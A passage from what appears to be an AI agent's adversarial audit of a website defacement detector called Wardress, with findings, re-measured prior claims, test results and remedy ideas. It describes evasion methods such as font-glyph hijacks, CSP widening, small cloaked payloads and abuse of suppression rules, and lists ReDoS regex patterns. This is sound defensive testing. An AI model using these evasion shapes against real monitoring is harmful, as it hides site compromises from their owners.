  | `VB2_webfont_swap` **benign twin** (`verdana.ttf`) | 0.6074 | 32 | 43 | 0.50 | **0.3627** | **0.9995** | `flagged` |
  Layer 4 reads the benign change as **1.19× more evidence** than the attack. The chroma channel is structurally blind to both (Δ 0.11 / 0.50, both inside the 2.0 deadband) because an outline swap and a face change are luminance-neutral.
- **Root cause**: rasterisation is the only evidence channel for a font attack, and rasterisation cannot attribute a re-typeset page to either cause. The only separator available is the 0.0129 of layer-2 tag churn from the added `<style>` element — a 1.286-weight channel against a 26.258-weight one, i.e. a **20:1** evidence imbalance. The brief's premise that a pure font swap might produce a very small delta is **refuted for a whole-page change** (ssim 0.6741, comparable to a full-page colour inversion at 0.7590) and would only hold for a glyph hijack scoped to a small region — which AUDIT-8-3's area curve shows is exactly the regime layer 4 misses anyway.
- **Proposed remedy category**: a `PageData`-level typography fingerprint (the declared `font-family` stack plus the resolved `@font-face` sources, including stylesheet-referenced faces per the AUDIT-4-8 handoff) so a *declared font change* is a first-class explanation for a layer-4 delta, exactly as a viewport change should be (AUDIT-8-12); keep a **localised** glyph-level check (per-token raster comparison over a small region) so a *partial* hijack is not diluted by page size.
- **Source**: Phase 8 §2.2 (the brief's mandate: "the pair must be reported together").

### AUDIT-8-15 — Every third-party-widget, vendor-script and new-stylesheet shape flags: 7 of 21 benign fixtures alert, 1 burns an LLM call per scan
- **Severity**: **High** — a false positive on legitimate, common site behaviour, independently reproducing AUDIT-SA2-1 and AUDIT-2-4 and quantifying the *escalation* consequence the prior phases did not measure. The escalation half is the operationally new part: a benign shape in the 0.40-0.75 band burns an LLM call on **every scan** of a site that has two webfonts.
- **Subsystem / file(s)**: `worker/detection/dom.py:640-676` (`_collect_refs` — no element identity), `:688-734` (`layer3_link_audit`; `weights` at `:704-710` give `iframe_src`/`script_src`/`form_action` **1.0** and `link_href` 0.6; `added = c_refs[kind] - b_refs[kind]` at `:713` diffs **sets of URLs**), `worker/detection/fusion.py:182-186` (the `new_sensitive_infrastructure` floor at 0.40), `worker/llm_escalation.py:37-45`.
- **Reproduction** (3 passes each, pstdev 0). **All seven carry the `new_sensitive_infrastructure` rule floor armed.**
  | fixture | benign shape | L2 | **L3** | fused | verdict | LLM |
  |---|---|---|---|---|---|---|
  | `B1_widget_appears` | Google reCAPTCHA `<iframe>` added | 0.5034 | **0.5934** | **0.8537** | `flagged` | no |
  | `B1b_widget_src_rotates` | the same reCAPTCHA `src` rotates between scans | 0.5034 | **0.5934** | **0.8537** | `flagged` | no |
  | `B1d_turnstile` | Cloudflare Turnstile added | 0.5034 | **0.5934** | **0.5635** | `flagged` | no |
  | `B2_vendor_script_added` | one legitimate vendor script | 0.5034 | **0.5934** | **0.5635** | `flagged` | no |
  | `B2b_vendor_2_scripts` | two vendor scripts | 0.7534 | **0.8347** | **0.7622** | `flagged` | no |
  | `B4_one_new_stylesheet` | one webfont | 0.0129 | 0.4173 | 0.3089 | `changed` | no |
  | `B4b_two_new_stylesheets` | two webfonts | 0.0255 | **0.6604** | **0.4511** | `changed` | **YES** |
  | `B1c_widget_same_domain_rotate` **control** | the same iframe's `src` rotates *within a known domain* | 0.0000 | **0.0200** | 0.1431 | `changed` | no |
  The control is the isolating measurement: the identical operation scores **0.5934** when the host is new and **0.0200** when it is known, a 30× gap, with no notion of *element identity* in between.
- **Root cause**: layer 3 diffs **sets of URLs**, so an element already on the page whose `src` value rotates is scored identically to a brand-new injection, and the sensitive kinds carry weight 1.0. Rotating third-party `src` is the single most common benign third-party pattern on the web. The `new_sensitive_infrastructure` floor at 0.40 then places these shapes in the *same bucket as a real script injection*, which is why they alert rather than merely escalate.
- **Proposed remedy category**: element-identity-aware reference diff (keyed on tag + position or a stable attribute) with `src`-value rotation classified separately from element addition; recalibrate the additive weights against the vendor-addition population my re-fusion measures; separate the *rule floor* for "new external origin" from "sensitive-kind reference appeared", so a widget does not inherit an injection's floor.
- **Source**: Phase 8 §1.4, Session A backlog rows 1, 2 and 4, AUDIT-SA2-1 and AUDIT-2-4 — all three independently confirmed, with the escalation consequence added.

---

## 4. Per-case root causes for every miss and false positive (Rule 19)

Every row in §1.3 and §1.4 is itemised above with a file/line root cause and a Fix-candidate / Accepted-risk disposition. No aggregate is accepted anywhere. Disposition summary:

| fixture(s) | disposition | finding |
|---|---|---|
| `BA7`, `BA7b`, `BA7c`, `E12` | **Fix-candidate** | AUDIT-8-1 (Critical) |
| `BA8` | **Fix-candidate** | AUDIT-8-2 (High) |
| `T2`, `T8` (with `T2b` and `VB4` as the scale controls) | **Fix-candidate** | AUDIT-8-3 (Critical) |
| `BA10` × 3 | **Fix-candidate** | AUDIT-8-4 (Critical) |
| `BA11c`, `E13`, `E14` (with `BA11b` as the confounded control) | **Fix-candidate** | AUDIT-8-5 (Critical) |
| `BA12`, `BA12b` | **Fix-candidate** | AUDIT-8-7 (High) |
| `E1`, `E2` | **Fix-candidate** | AUDIT-8-8 (High) |
| `E5`, `E9` | **Fix-candidate** | AUDIT-8-9 (Medium) |
| `T7c`, `T10b` | **Fix-candidate** | AUDIT-8-3 / AUDIT-8-10 (Medium each) |
| `S3h` | **Fix-candidate** | AUDIT-8-10 (High) |
| `VB3` | **Fix-candidate** | AUDIT-8-12 (High) |
| `E10`, `B3`, `B3b`, `B6`, `B5` | **Fix-candidate** | AUDIT-8-13 (High) |
| `VB2` | **Fix-candidate** | AUDIT-8-14 (High) |
| `B1`, `B1b`, `B1d`, `B2`, `B2b`, `B4b` | **Fix-candidate** | AUDIT-8-15 (High) |
| `E8b_precompiled_static` (reads `clean` on an already-compromised site) | **Accepted-risk** — see note | below |
| `BA11_unhide_..._hidden2hidden` (the wrong-direction control) | **Fix-candidate** on the *control* finding: a hidden-to-hidden farm whose hrefs rotate reads 0.2350, i.e. layer 3 does score a rotating *hidden* host — a partial mitigation of AUDIT-8-5 that the adversary defeats by keeping hrefs stable (`BA11c`) | AUDIT-8-5 |

**Accepted-risk with individual justification — `E8b_precompiled_static`.** A site compromised *before* Wardress takes its baseline, with the payload byte-identical across scans, reads `clean` at 0.0019 forever. This is a **design property, not a defect**: Wardress is a *change* monitor anchored on a trusted baseline, it has no historical or reputation signal, and a "the baseline itself is hostile" check is not implementable from a single capture pair. The rotating variant (`E8_precompiled_rotate`) is caught at 1.0000, so the exposure is bounded at "attack present at onboarding and unchanged thereafter", which for a defacement banner means it stays visible to every visitor. Surfacing it to the user for accept/reject; the cheap mitigation is an onboarding-time heuristic (a baseline whose own text trips a *strong* signature should refuse to become the trust anchor — a direct application of the existing `conclusive_signature_text` rule to the baseline side, which today is only ever applied to the scan side).

---

## 5. Log-vs-reality discrepancies

Every prior number I was told to verify, re-measured on this host in this session. **Both values are stated.**

| # | prior claim | source | my measurement | verdict |
|---|---|---|---|---|
| 1 | 36 of 323 benign rows reach 0.40; **34 exceed the 0.50 flag threshold** | Session A / AUDIT-2-4 | **36 of 323 reach 0.40; 34 exceed 0.50** — exact match | **CONFIRMED, digit for digit** |
| 2 | `vendor_script_added` mean **0.7538**, max **0.8269**, 100 % of the axis flags | Session A | mean **0.7538**, max **0.8269**, **26/26** over 0.50 | **CONFIRMED exactly** |
| 3 | `site_redesign` max **0.8454**, mean 0.3723 | Session A | max **0.8454**, mean **0.3723** | **CONFIRMED exactly** |
| 4 | `sanity_benign_quiet` = **0.6583** | Session A | **0.6583** | **CONFIRMED exactly** |
| 5 | the 152-row corpus has **0** benign rows crossing 0.40 (circular guard) | Session A / AUDIT-2-4 | **0 of 56**, max below 0.40; attack side 91/96 over 0.40, max 1.0 | **CONFIRMED** |
| 6 | rotating third-party widget flags at **0.6776**, 3/3, pstdev 0 | AUDIT-SA2-1 | reCAPTCHA widget added / `src` rotates: **0.8537**; Turnstile: **0.5635**; Intercom/analytics not rebuilt. Control (same-domain `src` rotate): **0.1431** | **CONFIRMED in kind, number differs** — my page carries a 14-article body and one known-vendor script, Session A's fixture differed; the control's 30× isolation reproduces exactly |
| 7 | a CSP widening scores **exactly 0.0**, scan reads `clean` at **0.0031** | AUDIT-SA2-2 | layer 6 **0.0000**, fused **0.0019** with real screenshots on both sides, 3/3 | **CONFIRMED** (mine is 0.0014 lower because layer 4 is *measured* here rather than degraded) |
| 8 | HSTS max downgrade `l6 = 0.1` → risk **0.0041** | AUDIT-SA2-2 | `l6 = 0.1000` → risk **0.0025** | **CONFIRMED in kind** |
| 9 | layer 7 is **exactly 0.0** for a small cloaked payload on a ≥146-token page | AUDIT-SA2-3 | **0.1032** at ~400 and ~1400 reference tokens, **0.1296** at ~60 | **PARTIALLY REFUTED.** With a *synthetic* 20-token payload it is 0.10-0.13, not 0.0 — the ramp starts at 0.15 so a 20/400 payload is below it and lands at 0.0, while 20/60 is above it and lands at 0.1296. **The finding's direction is confirmed and is if anything sharper: the score is a step function of page size, high on small pages and exactly 0.0 on realistic ones.** A ≤12-token payload is still 0.0 at any size (the grace). |
| 10 | subtle single-word tampering `two weeks`→`two days` = **0.1942** | AUDIT-2-1/2-2 | **`0.6718` `flagged`** | **REFUTED — the prior number is wrong in the dangerous direction.** A one-word edit on a punctuated page is now caught, via layer 4 (0.0973) plus `layer1_hash = 1.0`. The likely cause is that Session A's fixture had no screenshots (layer 4 degraded). Technique #7 is **not** genuinely absent; AUDIT-2-2's "single-word edits fuse only via l1 (≈0.14-0.30)" is **invalidated**. |
| 11 | `<meta http-equiv=refresh>` = **0.1987**; `location.replace` cloak = **0.3153** | AUDIT-2-3 | **both 1.0000 `flagged`**, L4 = 0.5610 | **REFUTED.** A 0-second meta-refresh fires *during* the Playwright capture, so the screenshot is the attacker's page and layer 4 catches it. Technique #9 is **partly covered** — a *non-zero-delay* meta-refresh or one that Chromium's navigation policy defers would still evade, which is a corpus gap, not a detection gap. |
| 12 | same-origin phishing overlay = **0.2242**; new-domain overlay = 0.5450 | AUDIT-2-2 | same-origin **0.9993 `flagged`** (L4 0.3420); new-domain 0.9998 | **REFUTED** — with a real screenshot the overlay is caught regardless of the form target. AUDIT-2-2's "only a new-domain overlay is caught" is **invalidated**. |
| 13 | a payload in a timed `<script>` string = **0.3153** | AUDIT-2-3 | **0.2330 `changed`** | **CONFIRMED, slightly lower** |
| 14 | attack **withdrawal** is caught at **0.9976** via layer 4 | AUDIT-2-1/2-2 (backlog item 18) | **0.7078 `flagged`**, L4 = 0.1031, L5 = L8 = 0.0, 3/3 | **CONFIRMED in kind, number differs** (my banner is smaller and the pair carries ordinary churn) |
| 15 | an over-broad suppression rule drops a conclusive defacement from 1.0 to `changed` at **0.195** | AUDIT-4-4 High half | `#banner` / `[role=alert]` / `main` / `[\s\S]+` all read **0.7044-0.7078 `flagged`**; a `bbox` + selector combination reads **0.1372 `changed`** | **PARTIALLY REFUTED, with the escalation preserved.** Content rules do **not** blind layer 4, so in production they reduce rather than suppress an alert. The **`bbox`** rule type does blind it, and that is the primitive that matters. |
| 16 | alternation bombs `(a|aa)+b` are the only ReDoS-shaped suppression rules that actually time out; 2.0 s per text node | AUDIT-4-4 | **CONFIRMED and sharpened.** `(a|aa)+b` and `(a|a)+b` hit the budget at **2001.4 / 2001.5 ms**; `^(a+)+$` costs **308 ms** without timing out; `([a-zA-Z]+)*!`, `(.*,)*[0-9]+`, `(\d+)+#`, `a*a*a*a*a*a*b` all complete in **≤ 3 ms** on a 5000-char catastrophic node. `unusable = 1` per side, exactly as logged. | **CONFIRMED** |
| 17 | "60 pathological nodes under one timing-out rule cost 2.00 s total, not nodes×2 s" | Session A | **CONFIRMED** — one timeout aborts the whole element loop, so the cost is bounded at ~2.0 s per *rule per side* regardless of node count | **CONFIRMED** |
| 18 | a hue-only brand refresh needs live measurement; layer 4 alone at 0.2379 flags; the synthetic hue test read 0.0 | Session A backlog row 19 | **real `hsl()` render, 3 passes: L4 = 0.0153, fused 0.1921, `changed`, no alert** (full rebrand twin 0.0235 / 0.2276) | **RESOLVED in the system's favour** — the concern is not realised. A hue-only refresh is **18× below** the material bar on a real render. |
| 19 | layer 4 on an **interactive** page is an open question (routed to Phase 8) | Session A "routed" list | 4 render pairs of a page with a rotating ad slot, consent widget, carousel, sticky header and live ticker: L4 **0.0031-0.0149**, fused **0.0021-0.0029**, `clean` 4/4. Static control 0.0000. | **ANSWERED POSITIVELY** — an interactive benign page's own nondeterminism stays **16× below** the 0.2225 escalation bar. |
| 20 | benign churn band **0.1907-0.2213**, pstdev 0.00000 | Session A / AUDIT-1-1 | 11 out-of-family shapes with real screenshots: **0.1372-0.5635**, pstdev **0.000000**; excluding the reCAPTCHA shape, **0.1372-0.2484** | **CONFIRMED in kind, band widened.** The floor is now the bare `layer1_hash` profile (0.1372 = `sigmoid(4.408-6.247)`) because my churn shapes do not perturb the content layers; the top is 0.2484 for an 8-article lazy append (Session A: 0.2213). The reCAPTCHA shape at 0.5635 is the outlier and is AUDIT-8-15. |
| 21 | layer 8 at its maximum produces only **0.1198**; layers 1/2/3/6/8 are individually incapable of reaching 0.40 | AUDIT-SA2-4 | **CONFIRMED by arithmetic from the deployed artifact** (pinned in the new test file) | **CONFIRMED** |
| 22 | the 152-row corpus guard is clean | Phase 2 / Session A | **0 of 56 benign rows over 0.40**; the new committed test re-derives this from the artifact | **CONFIRMED** |

**Also corrected: one measurement of my own.** An early probe in this session reported a suppression pattern (`([a-zA-Z]+)*!`) taking **8.77 s and 14.64 s** on 2 of 3 passes. That was **my own artifact**, not a finding: the probe was timing whole `run_detection` calls (including two 3 MB screenshots) on a host shared with two concurrent Wave-1 subagents, and the same pattern completes in **1.0-1.1 ms** on an isolated 5000-char catastrophic node. **No finding is based on it**, and the report records it so the number is not rediscovered as "new".

---

## 6. Verified-clean ledger (Rule 13 — measured, not doc-trusted)

| area | verdict | evidence |
|---|---|---|
| **The capture→screenshot path for visual fixtures** | **SOUND.** This was the brief's explicit crux. | **85/85 fixtures returned a *measured* layer 4** — never `degraded`, never `skipped` — with populated `ssim` / `phash_distance_bits` / `dhash_distance_bits` / `chroma_*` / per-side pixel dimensions. Layer 4 crashed **0** times across the whole 3-pass suite. Layer-4 unavailable is therefore **not** a reason for any miss in this report. |
| **Layer 4 against interactive pages** | **SOUND.** | 4 render pairs, L4 0.0031-0.0149, fused 0.0021-0.0029, `clean` 4/4, pstdev 0.000000. 16× below the 0.2225 escalation bar. Answers Session A's routed question in the positive direction. |
| **Layer 4 against render noise (static)** | **SOUND**, re-confirmed. | `P1_static_render_noise`: 4 cross pairs, L4 **0.0000** every time, fused 0.0019, `clean`. Independent of Session A's 0.0012 over a 1366×3442 render. |
| **Churn padding does not dilute an attack** | **SOUND.** | `E7` (defacement + 40 articles) = **1.0000**; the same 40 articles alone (`E10`) = 0.9981. The `conclusive_signature_text` floor is doing its job — exactly the property its comment claims. |
| **The layer-1 hash gate cannot be defeated by whitespace** | **SOUND** (10 candidate shapes, 0 collisions). | trailing spaces inside a line, trailing spaces with differing words, leading blank lines, CRLF vs LF, trailing `\n`, inter-tag whitespace, `\u00a0` vs space, comment-only delta, attribute reordering, and a trailing-space payload injection — **every** pair produced distinct digests, `layer1_hash = 1.0` throughout, and the last one correctly flagged at 0.8423. `hashing.normalize_content`'s per-line `rstrip` is representation-noise-only as its docstring claims. **No gate bypass was found.** |
| **The identical-hash gate** | **SOUND**, and it is not the source of any miss. | 17 fixtures with byte-identical HTML correctly read `layer1_hash = 0.0` with layers 2/3/5/8 `skipped`; the other 68 measured. The gate was never the reason a fixture read low — in every silent case some *other* channel was zero. |
| **The rule floors** | **SOUND as designed**, including on benign shapes. | `conclusive_signature_text` fired on 5 fixtures, always with a real conclusive payload. `severe_cloaking` fired **0** times — consistent with AUDIT-8-4 (no fixture reaches 0.85). `new_sensitive_infrastructure` fired on 9 fixtures, **6 of which are benign** — see AUDIT-8-15. |
| **ReDoS immunity of the suppression path** | **STRONGER than logged.** | 8 patterns × 2 document-position arms × 3 passes on a **5000-char** catastrophic node: `(a|aa)+b` and `(a|a)+b` hit the 2.0 s budget only when the pathological node is the **first** element in the document (2001.4 / 2001.5 ms); every other pattern completed in ≤ 3.0 ms, and the same pattern on the **same node** placed last costs 1.0-2.0 ms. The optimizer is position-sensitive, not pattern-insensitive. |
| **Pipeline determinism** | **SOUND.** | The whole 3-pass suite (83 single fixtures × 3 + 2 multi fixtures × 4 render pairs × 3 = **273 `run_detection` invocations**): **every** fused-risk pstdev exactly **0.000000**, **every** per-layer pstdev exactly **0.0**. Rule 18's variance record is trivially satisfied because the pipeline is a pure function of `PageData`. |
| **A wholly-blocked layer** | **n/a — never observed.** | No fixture produced a `degraded` layer except where a fixture *intentionally* degraded the UA probe (`T9c_meta_refresh_novariant`, layer 7), which still flagged at 1.0. |

---

## 7. Opportunities / Innovation ideas (Rule 17)

| # | Idea | Why it would help | Where it touches | Rough shape of the change |
|---|---|---|---|---|
| O-8-1 | **A "capture explanation" channel on `PageData`** — viewport, device class, `prefers-color-scheme`, declared font stack, resolved `@font-face` sources — that fusion treats as *explanations*, not evidence. | Closes AUDIT-8-12 (breakpoint restyle flags at 1.0) and AUDIT-8-14 (webfont swap flags) **in one change**, and it is the same mechanism AUDIT-4-7/4-8 already specified for completeness flags. It converts "the pixels differ" into "the pixels differ *and nothing else could explain it*", which is the only thing that would let layer 4's 26.26 coefficient be defended on a real page. | `worker/detection/types.py`, `worker/fetcher.py`, `worker/detection/visual.py`, `worker/detection/fusion.py` | Add a `capture_context: dict` to `PageData`; a `viewport_changed` / `font_stack_changed` / `color_scheme_changed` check inside `layer4_visual_diff` returning a discounted score plus an `explained_by` evidence key; a fusion term that *lowers* rather than raises. |
| O-8-2 | **Tile-localised layer 4** — grid-cell SSIM/pHash with a max or high-percentile aggregation instead of one whole-page mean. | Fixes AUDIT-8-3's area cliff (0.1 % of page = silent, 0.5 % = flagged) and simultaneously makes a *partial* `@font-face` hijack on a single heading detectable. Also makes layer 4 robust to a page that merely grew taller (the current `_common_size` crop means anything below 4096 px on a taller page is compared against nothing). | `worker/detection/visual.py:110-201` | Split the compared region into N×M cells; per-cell SSIM + pHash; score = `max(cell)` weighted by cell area, or the 90th percentile; keep the existing global terms as a floor rather than the only reading. Needs a corpus re-baseline (hash values shift) — the same trade Session A flagged for O-SA-3. |
| O-8-3 | **A suppression-coverage meter.** | AUDIT-8-10: an operator cannot tell that a rule of `main` or a `bbox` over the top 30 % has removed 100 % of the evidence for two to nine layers. A coverage figure in the evidence *and* in the UI turns every one of these findings from invisible to visible, and it is the cheapest possible mitigation for the whole suppression-adversary class. | `worker/detection/suppress.py:87-169`, `worker/scan_tasks.py` evidence writer, `frontend/src/.../suppression-panel.tsx` | `_apply_to_html` returns `(html, chars_removed, elements_removed)` per side; `Suppression.summary()` carries a per-rule and total coverage fraction; the frontend shows a bar and warns above a threshold. |
| O-8-4 | **A "what a JS-disabled visitor sees" secondary render**, kept as a low-weight, separately-attributed layer-4 input. | Closes the `<noscript>` half of AUDIT-8-9 with an existing mechanism (a second `page.screenshot` with `java_script_enabled=False`), and it also gives layer 4 a *progressive-enhancement diff*, which is a genuinely new signal class: a page whose no-JS render differs structurally from its JS render between two scans is a cloaking candidate even when the JS renders agree. | `worker/fetcher.py`, `worker/detection/types.py`, `worker/detection/visual.py` | One extra `context` with `java_script_enabled=False`; a `screenshot_nojs` field; a small weight so it cannot single-handedly flag. |
| O-8-5 | **An absolute-mass channel for layer 7**, alongside the existing relative one. | AUDIT-8-4. The docstring's own reasoning for the additive ramp ("punishes injected spam independent of how much shared base vocabulary dilutes the union") is right about *shared vocabulary* and wrong about *reference size*. An absolute token-count trigger is the missing half, and it needs no retune of the existing ramp. | `worker/detection/cloaking.py:86-118` | `absolute_add = min(1.0, added / 40)` OR-ed into `effective_additive`, with the 40 calibrated on a **crawler-side** population (what does a legitimate crawler variant add to a legitimate page?). Requires the `partial_cloaking_small_payload` corpus axis first. |
| O-8-6 | **A CSP source-expression restrictiveness table.** | AUDIT-8-1. Any token exchange is currently undeterminable, which is *every* real relaxation. A small ordered table (`'none'` < `'self'` < host < scheme < `*`; `'unsafe-inline'` weakest; `nonce-`/`hash-` strongest) turns a set comparison into a comparison, and it also gives the additive direction a correct sign for free. | `worker/detection/metadata.py:111-172` | `def _csp_restrictiveness(tok) -> int` plus per-directive min/max reduction; a change is `weaker` if min-over-tokens decreases, `stronger` if it increases, `unknown` only for genuinely incomparable cases. |
| O-8-7 | **A typography/`<base>`/event-handler reference surface for layer 3.** | AUDIT-8-8, AUDIT-8-14. One small collector that reads the document's effective base URL, its declared font stack, and any `on*` attribute with a `javascript:`/`http(s)://` target would close three findings and give layer 3 the *element identity* notion it has never had. | `worker/detection/dom.py:596-676` | Extend `_collect_refs` with `base_href`, `event_handler_target` (weight ~0.5) and `font_src`; resolve refs against the document base rather than `PageData.final_url`; key the diff on `tag+index+stable-attr` so a rotating `src` is classified as a *value change* rather than an addition. |
| O-8-8 | **A standing benign-population gate that fails the build** — every benign axis in `tools/build_fusion_dataset.py` must have ≥ 8 corpus rows, and the corpus validator must assert the *maximum* fused risk per benign axis, not just the attack peak. | Converts AUDIT-2-4 and AUDIT-8-13/15 from a one-time measurement into a permanent red signal. Session A's O-SA-12 proposed the row-count half; the *max-per-axis* assertion is the half that would have caught the four benign axes I measured at 0.85-1.0. | `backend/tools/build_regression_corpus.py:96-125, 212-247` | Add the 7 omitted benign axes; extend `validate()` with `for axis, rows in benign_by_axis: assert max(fused) < MATERIAL_CHANGE_RISK`; keep the failure message naming the axis and the rows. |
| O-8-9 | **Adversarial-shape fixtures as a first-class artifact, not a scratch script.** | This phase needed ~1 200 lines of harness to say 85 things about the detector. The harness is reusable and the fixtures are the *taxonomy*, not a one-off. A committed `backend/tests/fixtures/adversarial/` with a `PYTEST`-driven runner would make AUDIT-8-1…15 permanently re-measurable and would let a remediation prompt assert "the layer-4 area floor is now 0.2 %" as a *curve*, not a point. | new `backend/tests/fixtures/`, `backend/tools/run_detection_fixtures.py` | Deterministic fixture manifest + a browser-optional mode (synthetic screenshots, as in the new test file) and a browser mode for the visual rows. |
| O-8-10 | **A "changed-area" evidence field on every layer-4 result** — the fraction of the compared region that differs, computed alongside SSIM. | Would have made AUDIT-8-3 a one-line diagnosis rather than a nine-point sweep, and it is the natural companion to tile-localisation (O-8-2). Cheap: threshold the SSIM map (skimage returns it) and take the mean. | `worker/detection/visual.py:160-198` | `ssim_map = structural_similarity(..., full=True)`, `changed_area = float((ssim_map < 0.9).mean())`, surfaced in evidence. Costs one extra array. |
| O-8-11 | **Cross-check layer 1 against a *structural* hash.** | Layer 1 hashes a serialisation. A second, structure-only digest (tag counts + ref sets + visible-text shingle set) would make a hash-gate collision *detectable* rather than merely absent, and it would give `changed` a verdict basis that is not the raw byte flip — which is the substance of AUDIT-1-1's unresolved remedy. | `worker/hashing.py`, `worker/detection/pipeline.py:126-131` | A second `layer1b_structural` result (score None when identical, 1.0 when the structure differs) fed as a *separate* feature or as evidence on the existing one. No new fusion coefficient needed if it is evidence-only. |

---

## 8. New hermetic tests added

### 8.1 Committed (uncommitted in git — the coordinator decides)

`backend/tests/test_phase8_adversarial_detection.py` — **12 passing, 20 xfailed, 0 failed** (49.83 s). `ruff check`: *All checks passed!* `ruff format --check`: *1 file already formatted*. Screenshots are synthesised with PIL so the file is hermetic and browser-free; each row mirrors a real-Chromium measurement from this phase.

| class | tests | what it proves | status |
|---|---|---|---|
| `TestPhase8PositiveControls` | 7 | **The committed regression guard the phase recommends** — chiefly `test_attack_withdrawal_is_flagged_via_layer4` (Session A backlog item 18: caught, unguarded) and `test_attack_withdrawal_is_not_merely_the_byte_flip` (L5 = L8 = 0.0, so layer 4 alone carries it). Plus the html-banner flag, the render-noise floor, the AUDIT-4-6 removal-evidence characterization, the eight-article benign-churn bound, and the two AUDIT-SA2-4 reachability facts (layer 8 alone cannot reach 0.40; layer 4 alone at 0.24 can reach it). | **committed-passing** |
| `TestPhase8VisualOnlyAttacks` | 3 | the three mandated NB-DET-1 shapes are caught and layer 4 is the carrying channel | **committed-passing** |
| `TestPhase8VisualTwinAndScale` | 3 | the webfont-swap twin, the hue-refresh twin, and layer 4's missing area floor | **xfail** (AUDIT-8-14, AUDIT-8-3) |
| `TestPhase8HeaderAttacks` | 4 | CSP widening → `clean`; attacker-origin classified `stronger`; HSTS magnitude ungraded; `<meta http-equiv>` CSP unread | **xfail** (AUDIT-8-1, -2, -12) |
| `TestPhase8BenignFalsePositives` | 5 | reCAPTCHA / vendor script / two webfonts / redesign-class churn | 4 **xfail** (AUDIT-8-15, -13), 1 **committed-passing** (the 8-article bound) |
| `TestPhase8EvasionShapes` | 5 | `<base href>`, hidden-text reveal, removal-only, `<noscript>`, small cloaked payload | **xfail** (AUDIT-8-8, -5, -7, -9, -4) |
| `TestPhase8SuppressionAsAnAdversaryPrimitive` | 4 | guessed selector, `bbox` + selector, the armed regex-timeout asymmetry, the missing suppression-coverage signal | **xfail** (AUDIT-8-10, -11) |
| `TestPhase8CalibrationArtifact` | 2 | the `sanity_benign_quiet` row is above the flag threshold; **and the positive control that the 152-row corpus guard is genuinely clean, which is exactly why it is circular** | 1 **xfail** (AUDIT-2-4), 1 **committed-passing** |

**Rule 5 discipline:** every test that proves a gap exists is `xfail(strict=False)`, so a fixed behaviour surfaces as XPASS rather than a red suite. No committed test fails.

### 8.2 Scratch (outside the repo, per Rule 10 — not committed, described here so a remediation prompt can reproduce any number)

`C:\Users\Ns8pc\AppData\Local\Temp\opencode\wardress-session-b-detection\`

| file | purpose |
|---|---|
| `fxbase.py` | `PageData`/`ScanPageData` construction with production-identical `content_sha256`, and the `scan_tasks.py:300-327` verdict + `should_escalate` arithmetic reimplemented in-process |
| `pages.py` | the deterministic 14-article baseline page generator + the layer-7 UA-variant builder |
| `fixtures.py` | the 85-fixture programme (all 10 taxonomy techniques, the 3 mandated visual-only attacks, 5 visual twins, the 19-row backlog, the suppression adversary, 14 novel evasion shapes) |
| `make_fonts.py` | builds the 12-glyph-pair outline-swapped hijack TTF and the legitimate twin webfont with fontTools |
| `render_all.py` | the three-pass Chromium render, including the **server-side asset-swap** mechanism (same URL, different bytes between the two renders) |
| `rerender.py` / `findmissing.py` / `fixvb3.py` | the batch-render bug the runner's hard-fail guard caught, and the VB3 viewport re-render |
| `run_suite.py` | the single long-lived runner: load once, 3 passes per fixture, hard-fail on a missing screenshot, emit `results.json` |
| `show.py` / `rates.py` | the per-layer table and the rate computation |
| `aux.py` | ReDoS vs suppression, the layer-4 area sweep, the dataset re-fusion, the hash-gate search, the benign-churn band → `aux_results.json` |
| `redos.py` | the focused 8-pattern × 2-arm ReDoS probe plus the **armed-asymmetry** isolation |
| `visualev.py` | the layer-4 `ssim`/pHash/dHash/chroma evidence table for the visual rows → `visual_evidence.json` |
| `site/` (170 HTML files, 2 TTF, 3 SVG) + `shots/` (103 PNGs) | the rendered fixture corpus |

All of the above is deleted on coordinator instruction; every number in this report is reproducible from the committed test file plus the commands in §9.

---

## 9. Full regression results

```
cd C:\Users\Ns8pc\Music\WARDRESS\backend
$env:WARDRESS_TEST_DATABASE_URL = "postgresql+asyncpg://wardress:wardress@127.0.0.1:5433/wardress_sa_detect_test"
```

| command | result |
|---|---|
| `pytest -q -p no:cacheprovider tests/test_phase8_adversarial_detection.py -rxX` | **12 passed, 20 xfailed, 0 failed** in 49.83 s |
| `pytest -q -p no:cacheprovider tests/test_detection_e2e.py tests/test_detection_layers.py tests/test_detection_normalize.py tests/test_detection_fusion_pipeline.py tests/test_dom_content_churn.py tests/test_suppression.py tests/test_rule_floors.py tests/test_noise_floor.py tests/test_csp_nonce_normalization.py tests/test_pipeline_visual_gate.py tests/test_hashing.py tests/test_fusion_integration.py` | **222 passed** in 108.84 s — **exactly the recorded 12-file batch baseline (222 passed)** |
| `pytest -q -p no:cacheprovider tests/test_detection_regression.py tests/test_fusion_refit.py tests/test_fusion_dataset.py tests/test_phase4_fresh_eyes_finding_repros.py tests/test_phase20_semantics_drift.py tests/test_phase21_cloaking_grade.py tests/test_phase22_signatures_coverage.py tests/test_phase23_dom_hidden.py tests/test_phase24_degradation_signaling.py tests/test_phase36_detection_low.py tests/test_session_a2_detection_findings.py tests/test_phase8_adversarial_detection.py` | **331 passed, 20 xfailed** in 254.59 s — the 10-file batch baseline is 212 and Session A's file is 107, so 212 + 107 + 12 = **331**; both baselines reproduced exactly and the new file adds 12 passing + 20 xfail |
| `ruff check --no-cache tests/test_phase8_adversarial_detection.py` | *All checks passed!* |
| `ruff format --check --no-cache tests/test_phase8_adversarial_detection.py` | *1 file already formatted* |
| fixture suite (273 `run_detection` invocations, one process) | **85 fixtures × 3 passes (+ 2 fixtures × 4 render pairs × 3), every fused-risk pstdev 0.000000**, 322.9 s wall including the cold model load |
| `git -C C:\Users\Ns8pc\Music\WARDRESS status --short` | the only file I introduced is the untracked `backend/tests/test_phase8_adversarial_detection.py`; the implementation log's `M` predates this phase and I did not touch it |
| `git -C C:\Users\Ns8pc\Music\WARDRESS diff --stat HEAD -- backend/app backend/worker frontend/src docker-compose.yml scripts docs .env.example` | **empty** — zero production modifications (Rule 1) |

**Not run, and why:** the *full* backend suite (Session A's coordinator row measured 1457 passed / 6 errors with concurrent subagent files present). This phase touched one untracked test file inside the detection batch and owes no suite beyond it; running the full suite concurrently with two sibling Wave-1 subagents would have reproduced the `PYTEST_CURRENT_TEST` 32,767-char teardown errors Session A documented, which are a concurrency artifact and not a signal.

---

## 10. Coverage — what was and was not tested (Rule 8)

